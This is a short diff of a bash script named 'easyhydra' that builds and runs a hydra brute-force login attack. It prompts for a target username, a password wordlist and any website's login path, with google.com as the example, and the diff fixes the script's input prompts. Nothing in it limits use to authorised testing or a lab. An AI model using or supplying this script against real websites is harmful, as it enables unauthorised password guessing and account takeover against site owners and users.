@@ -9,16 +9,16 @@ echo "
 
 echo "Universal-ish password cracking command generator"
 echo "What is the username that you want to crack?"
-read $username
+read username
 echo "What is the directory of your wordlist? (usually /home/username/downloads/rockyou.txt)"
-read $directory
+read directory
 echo "What website do you need this to run on? (google.com, etc)"
-read $site
+read site
 echo "what is the login extention (site.com has the login page /login, so you would now enter /login for site)"
-read $extlink
+read extlink
 echo "what is the response? (if you type an incorrect password what does it respond with? like Incorrect Password!"
-read $response
+read response
 echo "Done! thanks for using easyhydra, hit enter to execute the command."
-read $ext
+read ext
 
 hydra -l $username -P $directory $site http-post-form "$extlink:username=^USER^&password=^PASS^:F=$response" -V
